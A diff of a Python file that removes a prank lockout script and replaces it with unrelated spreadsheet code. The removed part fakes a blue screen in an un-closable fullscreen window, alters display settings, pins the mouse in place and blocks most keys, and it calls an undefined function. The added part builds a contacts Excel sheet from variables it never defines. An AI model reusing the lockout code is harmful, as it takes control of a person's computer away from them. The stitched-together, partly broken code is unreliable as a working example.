@@ -1,94 +1,21 @@
-import pyautogui
-import keyboard
-import ctypes
-import threading
-import time
-import os
-import tkinter as tk
-import sys
+# Re-run the Excel creation since the tool is now available again.
 
-def fake_bsod():
-    os.system('cls')
-    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 6)  # 6 = SW_MINIMIZE
-    pyautogui.FAILSAFE = False
-    screen_w, screen_h = pyautogui.size()
+# Create workbook and worksheet
+wb_corrected = Workbook()
+ws_corrected = wb_corrected.active
+ws_corrected.title = "Contacts 4x16"
 
-    bsod_text = """
-    wtf????!?!?!?!?
-    """
+# Fill the worksheet to match 4-column and 16-row structure
+for row_idx, row in enumerate(structured_data_4x16, start=1):
+    for col_idx, (name, phone) in enumerate(row, start=1):
+        ws_corrected.cell(row=row_idx, column=col_idx, value=f"{name}\n{phone}")
 
-    root = tk.Tk()
-    root.title("BSOD")
-    root.attributes('-fullscreen', True)
-    root.configure(bg='#0000AA')
+# Adjust column widths
+for col in range(1, 5):
+    ws_corrected.column_dimensions[get_column_letter(col)].width = 30
 
-    label = tk.Label(
-        root,
-        text=bsod_text,
-        fg="white",
-        bg="#0000AA",
-        font=("Consolas", 18)
-    )
-    label.pack(expand=True)
+# Save the updated file
+final_excel_path = "/mnt/data/contacts_exact_layout_4x16.xlsx"
+wb_corrected.save(final_excel_path)
 
-    def disable_close(*args, **kwargs):
-        return "break"
-
-    root.protocol("WM_DELETE_WINDOW", disable_close)
-    root.bind("<Alt-F4>", disable_close)
-    root.bind("<F11>", disable_close)
-    root.bind("<Escape>", disable_close)
-
-    ctypes.windll.user32.SetDisplayConfig(0, None, 0, None, 0x80)
-
-    def restore_color():
-        time.sleep(1000000000)
-        ctypes.windll.user32.SetDisplayConfig(0, None, 0, None, 0)
-
-    color_thread = threading.Thread(target=restore_color, daemon=True)
-    color_thread.start()
-
-    unlock_thread = threading.Thread(target=unlock_input, daemon=True)
-    unlock_thread.start()
-
-    root.mainloop()
-
-def block_input():
-    end_time = time.time() + 100000000000
-    while time.time() < end_time:
-        screen_w, screen_h = pyautogui.size()
-        center_x = screen_w / 2
-        center_y = screen_h / 2
-        pyautogui.moveTo(center_x, center_y)
-        time.sleep(0.01)
-
-def block_keyboard():
-    modifiers = keyboard.all_modifiers
-    for key in modifiers:
-        keyboard.block_key(key)
-
-    for i in range(150):
-        try:
-            keyboard.block_key(str(i))
-        except:
-            pass
-
-    try:
-        keyboard.block_key('windows')
-        keyboard.block_key('winleft')
-        keyboard.block_key('winright')
-        keyboard.block_key('f11')
-        keyboard.block_key('alt')
-        keyboard.block_key('tab')
-        keyboard.block_key('esc')
-    except:
-        pass
-
-if __name__ == "__main__":
-    input_thread = threading.Thread(target=block_input, daemon=True)
-    input_thread.start()
-
-    keyboard_thread = threading.Thread(target=block_keyboard, daemon=True)
-    keyboard_thread.start()
-
-    fake_bsod()
+final_excel_path
